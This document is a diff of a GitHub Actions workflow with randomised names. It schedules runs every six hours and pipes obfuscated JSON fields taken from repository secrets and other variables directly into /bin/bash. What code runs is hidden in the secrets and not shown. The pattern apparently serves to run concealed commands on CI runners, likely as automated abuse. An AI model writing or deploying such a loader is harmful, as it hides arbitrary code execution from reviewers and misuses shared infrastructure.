@@ -1,25 +1,29 @@
 name: zhonghutu1056
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 0/6 * * *'
-
+    - cron: '45 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhonghutu1056
         env:
-          abohs1: ${{ secrets.abohs1 }}
+          ydgpv9078: ${{ secrets.ydgpv9078 }}
         run: |
-          echo $abohs1 | jq -r .unx65977 | /bin/bash
-          echo $ki86416 | jq -r .q950 | /bin/bash
-          echo $saf503 | jq -r .broc8 | /bin/bash
-          echo $mdy84 | jq -r .jjkg75 | /bin/bash
-          echo $w77 | jq -r .r7 | /bin/bash
-          echo $c6 | jq -r .hqjez4575 | /bin/bash
-          echo $a932 | jq -r .aqc6011 | /bin/bash
-          echo $fzneg3003 | jq -r .zjag576 | /bin/bash
+          echo $ydgpv9078 | jq -r .lryuh5 | /bin/bash
+          echo $xj6 | jq -r .f5 | /bin/bash
+          echo $osm6276 | jq -r .d78173 | /bin/bash
+          echo $rhecq1987 | jq -r .ki5504 | /bin/bash
+          echo $o1635 | jq -r .yg039 | /bin/bash
+          echo $psxc2427 | jq -r .rq2031 | /bin/bash
+          echo $gctes02186 | jq -r .g18878 | /bin/bash
+          echo $l08 | jq -r .g89917 | /bin/bash
+          echo $qtu317 | jq -r .gnwjy8356 | /bin/bash
+          echo $peh09159 | jq -r .iwkwf41373 | /bin/bash
+          echo $obg6 | jq -r .xha78299 | /bin/bash
+          echo $qfy591 | jq -r .m5676 | /bin/bash
+          echo $q466 | jq -r .jqplf77 | /bin/bash
 
